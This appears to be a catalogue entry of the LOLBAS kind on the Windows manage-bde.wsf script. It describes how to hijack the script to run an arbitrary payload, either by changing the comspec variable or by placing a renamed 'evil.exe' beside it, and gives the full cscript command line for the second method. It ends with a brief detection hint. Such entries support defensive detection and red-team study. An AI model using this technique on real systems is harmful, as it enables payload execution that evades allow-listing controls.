name: Manage-bde.wsf
author: Oddvar Moe

commands.description: Set the comspec variable to another executable prior to calling manage-bde.wsf for execution.
commands.os: Windows Vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11

commands.command: copy c:\users\person\evil.exe c:\users\public\manage-bde.exe & cd c:\users\public\ & cscript.exe c:\windows\system32\manage-bde.wsf
commands.description: Run the manage-bde.wsf script with a payload named manage-bde.exe in the same directory to run the payload file.
commands.os: Windows Vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11

detection: Manage-bde.wsf should not be invoked by a standard user under normal situations
